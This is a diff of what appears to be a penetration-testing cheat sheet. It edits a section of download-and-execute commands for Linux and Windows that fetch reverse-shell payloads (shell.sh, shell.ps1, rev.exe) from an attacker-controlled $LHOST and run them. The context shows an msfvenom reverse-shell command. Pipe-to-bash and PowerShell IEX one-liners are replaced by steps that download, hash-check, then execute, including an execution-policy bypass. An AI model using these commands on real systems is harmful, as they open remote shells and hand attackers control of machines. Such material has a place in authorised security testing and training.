@@ -271,13 +271,22 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 \
 python3 -m http.server 8080
 
 # Download + execute (Linux)
-curl http://$LHOST:8080/shell.sh | bash
-wget -qO- http://$LHOST:8080/shell.sh | bash
+curl -fLo shell.sh "http://$LHOST:8080/shell.sh"
+sha256sum shell.sh
+less shell.sh
+chmod 700 shell.sh && ./shell.sh
+wget -qO shell.sh "http://$LHOST:8080/shell.sh"
+printf '%s  %s\n' "$EXPECTED_SHA256" shell.sh | sha256sum -c -
+chmod 700 shell.sh && ./shell.sh
 
 # Download + execute (Windows)
-powershell "IEX(New-Object Net.WebClient).downloadString('http://$LHOST:8080/shell.ps1')"
-certutil.exe -urlcache -split -f http://$LHOST:8080/rev.exe C:\Temp\rev.exe && C:\Temp\rev.exe
-bitsadmin /transfer job /download /priority high http://$LHOST:8080/rev.exe C:\Temp\rev.exe
+Invoke-WebRequest "http://$LHOST:8080/shell.ps1" -OutFile C:\Temp\shell.ps1
+Get-FileHash C:\Temp\shell.ps1 -Algorithm SHA256
+powershell -ExecutionPolicy Bypass -File C:\Temp\shell.ps1
+
+certutil.exe -urlcache -split -f http://$LHOST:8080/rev.exe C:\Temp\rev.exe
+certutil.exe -hashfile C:\Temp\rev.exe SHA256
+C:\Temp\rev.exe
 ```
 
 ---
